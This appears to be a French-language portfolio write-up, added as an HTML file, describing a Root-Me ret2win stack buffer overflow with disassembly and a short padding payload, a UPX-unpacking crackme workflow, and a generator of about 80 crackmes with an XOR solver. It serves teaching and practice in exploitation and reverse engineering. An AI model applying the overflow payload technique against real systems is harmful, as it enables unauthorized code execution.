@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CTF & Reverse Engineering : ret2win, unpacking & une suite de 80 crackmes · Mohamed Salhi</title>
+<meta name="description" content="Sélection de reverse engineering : un stack buffer overflow ret2win sur Root-Me, l'analyse d'un crackme ELF packé UPX, et une suite de ~80 crackmes auto-générés avec solveurs scriptés.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400..900;1,9..144,400..700&family=IBM+Plex+Sans:wght@300;400;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="wu.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%230a0b0e'/><text x='50' y='72' font-size='62' text-anchor='middle' fill='%23c9f24d' font-family='monospace' font-weight='700'>M</text></svg>">
+</head>
+<body>
+<div class="bg-glow"></div><div class="bg-grid"></div><div class="bg-grain"></div>
+
+<div class="topbar"><div class="topbar-in">
+  <a class="back" href="../">← Mohamed Salhi</a><span class="sep">/</span>
+  <a class="back" href="../#writeups">write-ups</a><span class="sep">/</span>
+  <span class="here">ctf-reverse-engineering</span>
+</div></div>
+
+<article class="wrap">
+  <div class="kicker">CTF · Reverse engineering</div>
+  <h1 class="title">CTF &amp; RE : ret2win, unpacking, et une suite de 80 crackmes</h1>
+  <div class="meta">
+    <span class="m date">2026</span>
+    <span class="m">Root-Me · ELF/PE</span>
+    <span class="m">IDA · gdb+pwndbg · pwntools</span>
+  </div>
+  <p class="lead">Trois angles de reverse : une <em>exploitation binaire</em> propre (ret2win) sur Root-Me, le <em>dé-packing</em> et l'analyse d'un crackme protégé, et un projet à part — un <em>générateur</em> de ~80 crackmes que je résous par script.</p>
+
+  <h2><span class="n">01</span> Root-Me — Stack buffer overflow &amp; ret2win</h2><div class="rule"></div>
+  <p>Challenge <code>app-systeme-ch72</code> : un PE32 x86 qui lit son entrée avec une fonction de type <code>gets()</code> dans un buffer de 16 octets, sans contrôle de longueur. Objectif : lire un fichier protégé appartenant à un autre utilisateur.</p>
+  <table class="tbl">
+    <thead><tr><th>Protection</th><th>État</th></tr></thead>
+    <tbody>
+      <tr><td>ASLR</td><td>OFF</td></tr>
+      <tr><td>DEP</td><td>OFF</td></tr>
+      <tr><td>Stack cookie (<code>main</code>)</td><td>absent</td></tr>
+    </tbody>
+  </table>
+  <p>Avec ASLR/DEP off et pas de cookie, c'est un <b>ret2win</b> : il existe une fonction cadeau qui <code>system()</code> un shell. Il suffit d'écraser l'adresse de retour de <code>main</code> par la sienne.</p>
+  <pre><code><span class="cm">; give_shell @ 0x401000 — la cible ret2win</span>
+<span class="ad">0x401000</span>  <span class="kw">push</span>  <span class="ad">0x41b000</span>       <span class="st">; "C:\Windows\system32\cmd.exe"</span>
+<span class="ad">0x401005</span>  <span class="kw">call</span>  <span class="ad">0x403bcc</span>       <span class="cm">; system()</span>
+<span class="ad">0x40100d</span>  <span class="kw">ret</span></code></pre>
+  <p>Layout de pile de <code>main</code> : buffer 16 o → counter 4 o → saved EBP 4 o → <b>return address</b>. Le padding est donc de 24 octets avant d'atteindre EIP, qu'on remplace par <code>0x401000</code>.</p>
+  <pre><code><span class="cm"># payload</span>
+payload = <span class="st">b"A"</span>*24 + p32(<span class="ad">0x401000</span>)   <span class="cm"># ret → give_shell → cmd.exe</span></code></pre>
+  <div class="result"><span class="t">Flag</span> 466aa7907db6…1388c7</div>
+
+  <h2><span class="n">02</span> Crackme ELF packé UPX</h2><div class="rule"></div>
+  <p>Cible : un ELF 64-bit PIE, <b>strippé</b> et <b>packé UPX 4.2.2</b> (6,7 Ko → 15 Ko une fois déballé). Le workflow de RE d'un binaire protégé, en condensé :</p>
+  <div class="steps">
+    <div class="step"><b>Triage</b> : <code>file</code>, entropie, sections — l'entropie élevée + les tags <code>UPX!</code> trahissent le packer.</div>
+    <div class="step"><b>Unpacking</b> : restauration de l'image déballée pour retrouver un binaire analysable statiquement.</div>
+    <div class="step"><b>Statique</b> : reconstruction de la logique de validation (routine de check, transformations sur l'entrée).</div>
+    <div class="step"><b>Dynamique</b> : gdb+pwndbg pour confirmer le flux, court-circuiter l'anti-debug, observer la comparaison finale.</div>
+    <div class="step"><b>Solve</b> : inverser la transformation pour reconstruire l'entrée acceptée.</div>
+  </div>
+  <p class="small">La même démarche que sur un échantillon suspect : identifier la protection, la retirer, isoler la logique utile, prouver le comportement.</p>
+
+  <h2><span class="n">03</span> Projet : un générateur de ~80 crackmes</h2><div class="rule"></div>
+  <p>Pour m'entraîner (et entraîner d'autres), j'ai écrit un <b>générateur</b> qui produit ~80 crackmes répartis en tiers de difficulté, chacun accompagné d'un <b>solveur scripté</b>. C'est autant un exercice de RE que de construction d'outils.</p>
+  <table class="tbl">
+    <thead><tr><th>Tier</th><th>Techniques couvertes</th></tr></thead>
+    <tbody>
+      <tr><td>1 — Warmup</td><td><code>strings</code>, <code>strcmp</code>, assemblage de chaîne à l'exécution</td></tr>
+      <tr><td>2 — Encodages</td><td>XOR mono-octet, XOR à clé, base64</td></tr>
+      <tr><td>3 — Logique</td><td>équations, transformations arithmétiques, inversions</td></tr>
+      <tr><td>4 — Obfuscation</td><td>machines virtuelles maison, chaînes reconstruites</td></tr>
+      <tr><td>5 — Anti-analyse</td><td>anti-debug, entrées via argv multiples / variables d'env</td></tr>
+    </tbody>
+  </table>
+  <pre><code><span class="cm"># chaque crackme a son solveur — pattern type (XOR)</span>
+key = <span class="ad">0x5A</span>
+flag = bytes(c ^ key <span class="kw">for</span> c <span class="kw">in</span> stored)   <span class="cm"># password[i] ^ 0x5A</span></code></pre>
+  <div class="result"><span class="t">Livrable</span> ~80 crackmes générés + solveurs (Python / pwntools)</div>
+
+  <h2><span class="n">Bilan</span></h2><div class="rule"></div>
+  <ul>
+    <li><b>Exploitation binaire</b> : lecture de pile, contournement d'absence de protections, ret2win.</li>
+    <li><b>Anti-protection</b> : dé-packing, anti-debug, VM d'obfuscation.</li>
+    <li><b>Outillage</b> : automatiser la génération et la résolution — penser en producteur autant qu'en solveur.</li>
+  </ul>
+</article>
+
+<div class="wu-foot"><div class="row">
+  <a href="../#writeups">← tous les write-ups</a>
+  <div class="more">
+    <a href="nft-tunnel-lpe.html">Linux : UAF noyau → root →</a>
+    <a href="stages.html">Stages : ce que j'y ai construit →</a>
+  </div>
+</div></div>
+</body>
+</html>
